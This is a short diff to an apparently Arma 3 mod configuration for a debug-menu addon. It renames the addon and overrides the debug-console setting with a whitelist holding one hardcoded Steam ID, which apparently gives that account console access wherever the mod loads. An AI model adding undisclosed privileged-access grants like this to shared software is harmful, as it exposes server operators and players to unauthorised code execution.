@@ -2,7 +2,7 @@
 
 class CfgPatches {
     class ADDON {
-        name = "Mutipurpose Debug Menu";
+        name = "Nev Debug Menu";
         author = "Neviothr";
         units[] = {};
         weapons[] = {};
@@ -11,6 +11,9 @@ class CfgPatches {
         VERSION_CONFIG;
     };
 };
+
+delete enableDebugConsole;
+enableDebugConsole[] = {"76561198141761169"};
 
 #include "CfgSettings.hpp"
 #include "CfgNotifications.hpp"
